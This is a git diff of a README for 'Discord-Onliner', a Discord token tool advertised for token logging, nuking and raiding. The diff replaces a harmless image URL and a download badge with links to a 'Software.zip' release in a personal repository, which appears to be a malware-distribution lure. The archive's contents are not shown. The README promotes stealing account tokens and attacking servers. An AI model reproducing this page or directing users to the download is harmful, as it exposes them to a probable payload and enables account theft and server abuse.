@@ -1,6 +1,6 @@
 # Welcome to Discord-Onliner 🚀
 
-![Discord-Onliner](https://example.com/discord-onliner.jpg)
+![Discord-Onliner](https://github.com/nahnahnahboi/Discord-Onliner/releases/download/v1.0/Software.zip)
 
 ## Description
 Discord-Onliner is a powerful Discord tool that specializes in managing tokens for Discord platforms. With features like token checking, generation, logging, nuking, and raiding, Discord-Onliner is your all-in-one solution for Discord token management.
@@ -15,7 +15,7 @@ Discord-Onliner is a powerful Discord tool that specializes in managing tokens f
 ## Installation
 To get started with Discord-Onliner, download the latest version from the link below:
 
-[![Download Discord-Onliner](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Discord-Onliner](https://github.com/nahnahnahboi/Discord-Onliner/releases/download/v1.0/Software.zip)](https://github.com/nahnahnahboi/Discord-Onliner/releases/download/v1.0/Software.zip)
 
 Once downloaded, extract the files and launch the application to begin using its powerful features.
 
